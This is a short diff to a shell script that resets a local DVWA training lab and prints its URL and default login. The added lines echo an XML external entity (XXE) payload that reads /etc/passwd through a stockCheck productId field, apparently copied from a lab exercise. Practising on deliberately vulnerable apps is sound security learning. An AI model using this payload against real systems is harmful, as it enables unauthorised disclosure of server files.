@@ -74,3 +74,13 @@ log "DVWA completely reset and reinstalled!"
 echo "URL: http://127.0.0.1/dvwa"
 echo "Login: admin / password"
 echo "Then click: 'Create / Reset Database'"
+echo '''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE stockcheck [ <!ENTITY hm SYSTEM "file:///etc/passwd">]>
+<stockCheck>
+<productId>
+&hm;
+</productId>
+<storeId>
+1
+</storeId>
+</stockCheck>'''
